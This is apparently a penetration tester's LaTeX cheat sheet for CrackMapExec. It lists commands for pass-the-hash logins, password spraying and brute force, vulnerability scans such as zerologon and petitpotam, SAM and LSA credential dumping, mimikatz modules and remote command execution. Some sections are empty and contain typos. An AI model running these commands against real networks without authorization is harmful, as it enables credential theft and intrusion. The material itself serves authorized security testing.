\section{CrackMapExec}
\label{tool:crackmapexec}
\subsection*{Introduction}
\href{https://mpgn.gitbook.io/crackmapexec/}{CrackMapExec} (a.k.a CME) is a post-exploitation tool that helps automate
assessing the security of large Active Directory networks. Built with stealth
in mind, CME follows the concept of "Living off the Land": abusing built-in
Active Directory features/protocols to achieve it's functionality and allowing
it to evade most endpoint protection/IDS/IPS solutions.


CME makes heavy use of Impacket and PowerSploit for working with network protocols and performing a variety of post-exploitation techniques.

\subsection*{General}

\subsubsection*{Target format}
\begin{verbatim}
crackmapexec PROTO <FQDN>
crackmapexec PRTOTO <IP> <IP> ...

crackmapexec <PROTO> <IP RANGE> <IP RANGE> ... # 192..168.2.3-67
crackmapexec <PROTO> <FILE>
\end{verbatim}

\subsubsection*{Authentication}
Login / password
\begin{verbatim}
crackmapexec PROTO TARGET_SPEC -u username -p 'Admin!123@'
# local account
crackmapexec PROTO TARGET_SPEC -u username -p 'Admin!123@' --local-auth
# if begin with dash
crackmapexec PROTO TARGET_SPEC -u='-username' -p='-Admin!123@'
\end{verbatim}

Login / Hash
\begin{verbatim}
crackmapexec PROTO TARGET_SPEC -u username -H HASH

# local account
crackmapexec PROTO TARGET_SPEC -u username -H HASH --local-auth


\end{verbatim}


Kerberos (KRB5CCNAME env name to specify the path to the
\href{https://web.mit.edu/kerberos/krb5-1.12/doc/basic/ccache_def.html}{ccache
ticket})
\begin{verbatim}
export KRB5CCNAME=/PATH/TO/CCACHE_FILE
cme PROTO TARGET_SPEC --kerberos
\end{verbatim}


\subsubsection*{Using modules}
\begin{verbatim}
# list modules
cme PROTO -L
# view a modules supported options, e.g:
cme PROTO -M <module name> --options 

cme PROTO TARGET_SPEC LOGIN_SPEC -M mimikatz -o COMMAND='privilege::debug'
\end{verbatim}


\subsubsection*{Bloodhound integration}
 \verb+~/.cme/cme.conf+
\begin{verbatim}
[BloodHound]
bh_enabled = True
bh_uri = 127.0.0.1
bh_port = 7687
bh_user = user
bh_pass = pass
\end{verbatim}



\subsubsection*{Database General Usage}
All workspaces and their relative databases are stored in
\verb+~/.cme/workspaces+

\begin{verbatim}
cmedb

help

#creta a workspace
workspace create test

#swhich workspace
workspace NAME 
# acceds sub-workspace proto
proto PROTO 

back
\end{verbatim}

\subsection*{SMB}

\subsubsection*{Authentication}

For Null session ommit login / password params

For Anonymous \verb+-u 'a' -p ''+

For Domain NT hash \verb+-u Administrator -H 'NT_HASH'+

For Domain full hash (NTLM) 
\verb+-u Administrator -H 'NT_HASH:LM_HASH'+


\subsubsection*{Scan for vulnerabilities}
\begin{verbatim}
crackmapexec smb TARGET_SPEC  -u '' -p '' -M zerologo
crackmapexec smb TARGET_SPEC  -u '' -p '' -M petitpotam
crackmapexec smb TARGET_SPEC  -u 'user' -p 'pass' -M nopac
\end{verbatim}

\subsubsection*{Enumeration}
\label{tool:crackmapexec:smb:enum}

\begin{itemize}
    \item hosts (without args)
    \item active sessions (\verb+--sessions+)
    \item shares and access (\verb+--shares+)
    \item disks (\verb+--disks+)
    \item logged on users (\verb+--loggeon-users+)
    \item domain users (\verb+--users [USER]+)
    \item RID bruteforce (\verb+--rid-brute+)
    \item domain groups (\verb+--groups [GROUP]+)
    \item local groups (\verb+--local-group [GROUP]+)
    \item password policy (\verb+--pass-pol+)
    \item hosts without SMB signing required (\verb+--gen-relay-list FILE+)
\end{itemize}

\subsubsection*{Password and local admin spraying}
\label{tool:crackmapexec:smb:spraying}

\verb+--local-auth+ for local accoount brute force.

\verb+-u+ and \verb+-v+ can accept either a file or a list of value (space
separetad).

By default CME stop at the fist match except if parameter
\verb+--continue-on-success+ is specified

With 2 lists  and without \verb+--no-bruteforce+ option CME will perform every
couple.

\begin{verbatim}
crackmapexec smb IP -u USER_FILE -p PASSWORD_1 PASSWORD_2 ... 
\end{verbatim}


Local Admin Spraying
\label{tool:crackmapexec:localadmin-spraying}
\begin{verbatim}
crackmapexec smb --local-auth TARGET_SPEC LOGIN_SPEC
\end{verbatim}

To filter Logon failure use \verb-| grep +-

\subsubsection*{Dumping credentials}
\label{tool:crackmapexec:smb:cred-dumping}
\begin{verbatim}
# SAM
crackmapexec smb TARGET_SPEC LOGIN_SPEC --sam

# LSA
crackmapexec smb TARGET_SPEC LOGIN_SPEC --lsa
\end{verbatim}

\subsubsection*{Spidering Share}
\begin{verbatim}
crackmapexec smb TARGET_SPEC LOGIN_SPEC -M spider_plus --share SHARE_NAME
\end{verbatim}

\subsubsection*{Remote code execution}
\label{tool:crackmapexec:smb:rce}

\verb+-x+ to run cmd commands or \verb+-X+ to run PowerShell commands.

by default  CrackMapExec will try to execute the atexec
method~\ref{tools:impacket:atexec} if it fails try with 
\verb+--exec-method smbexec+

\verb+cme smb TARGET_SPEC LOGIN_SPEC -x 'CMD' --exec-method smbexec+


\subsection*{LDAP}
\subsubsection*{}
\begin{verbatim}
\end{verbatim}

\subsection*{WinRM}
\subsubsection*{Account bruteforce}
\label{tool:crackmapexec:winrm:bruteforce}

\verb+crackmapexec winrm IP -u user.list -p password.list+

\subsubsection*{}
\begin{verbatim}
\end{verbatim}

\subsection*{MSSQL}
\subsubsection*{}
\begin{verbatim}
\end{verbatim}

